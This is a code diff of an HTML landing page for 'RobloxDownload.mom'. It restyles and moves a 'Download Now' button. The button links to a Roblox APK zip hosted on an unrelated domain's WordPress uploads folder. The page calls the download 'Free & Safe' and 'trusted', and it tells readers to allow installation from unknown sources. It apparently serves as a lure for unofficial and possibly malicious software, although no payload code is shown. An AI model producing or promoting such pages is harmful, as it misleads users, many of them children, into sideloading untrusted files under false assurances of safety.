@@ -50,13 +50,13 @@
 
     footer { background:#111; color:#fff; text-align:center; padding:15px 0; font-size:14px; flex-shrink:0; }
 
-    /* ✅ Download Now Button */
+    /* ✅ Updated Download Button */
     .download-btn {
       display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 12px;
-      background: linear-gradient(135deg, #ff5f6d, #ffc371);
+      background: linear-gradient(135deg, #36d1dc, #5b86e5);
       color: #fff;
       padding: 16px 36px;
       border-radius: 12px;
@@ -72,10 +72,10 @@
     .download-btn:hover {
       transform: translateY(-3px);
       box-shadow: 0 12px 25px rgba(0,0,0,0.35);
-      background: linear-gradient(135deg, #ff758c, #ffdab9);
+      background: linear-gradient(135deg, #5b86e5, #36d1dc);
     }
 
-    /* Arrow animation */
+    /* Arrow on left */
     .download-btn .arrow {
       width: 24px;
       height: 24px;
@@ -85,7 +85,7 @@
 
     @keyframes moveArrow {
       0% { transform: translateX(0); }
-      50% { transform: translateX(6px); }
+      50% { transform: translateX(-6px); }
       100% { transform: translateX(0); }
     }
   </style>
@@ -110,7 +110,14 @@
     <div class="banner-content">
       <h1>Download Roblox APK – Free & Safe (2025)</h1>
       <p>Experience endless fun. Download the latest Roblox APK securely from RobloxDownload.mom.</p>
-      <a href="https://dooflixtv.net/wp-content/Roblox%20download%20apk.zip" class="banner-btn" target="_blank" rel="noopener noreferrer" download>Download Now</a>
+      <!-- ✅ Updated Button -->
+      <a href="https://dooflixtv.net/wp-content/Roblox%20download%20apk.zip" class="download-btn" target="_blank" rel="noopener noreferrer" download>
+        <svg class="arrow" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="5" y1="12" x2="19" y2="12"></line>
+          <polyline points="12,5 19,12 12,19"></polyline>
+        </svg>
+        Download Now
+      </a>
     </div>
     <div class="banner-image">
       <img src="banner-image.webp" alt="Roblox Banner">
@@ -137,31 +144,7 @@
         <li>Allow installation from unknown sources if prompted.</li>
         <li>Open Roblox and start playing!</li>
       </ol>
-
-      <!-- ✅ Download Now Button -->
-      <a href="https://dooflixtv.net/wp-content/Roblox%20download%20apk.zip" class="download-btn" target="_blank" rel="noopener noreferrer" download>
-        Download Now
-        <svg class="arrow" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-          <line x1="5" y1="12" x2="19" y2="12"></line>
-          <polyline points="12,5 19,12 12,19"></polyline>
-        </svg>
-      </a>
     </div>
   </main>
 
   <footer>
-    <h3>Welcome to RobloxDownload.mom — your trusted place to download the latest Roblox APK safely and easily.</h3>
-    &copy; 2025 RobloxDownload.mom | All Rights Reserved.
-  </footer>
-
-  <script>
-    const menuToggle = document.querySelector('.menu-toggle');
-    const navMenu = document.querySelector('nav ul');
-    if(menuToggle){
-      menuToggle.addEventListener('click', () => {
-        navMenu.classList.toggle('show');
-      });
-    }
-  </script>
-</body>
-</html>
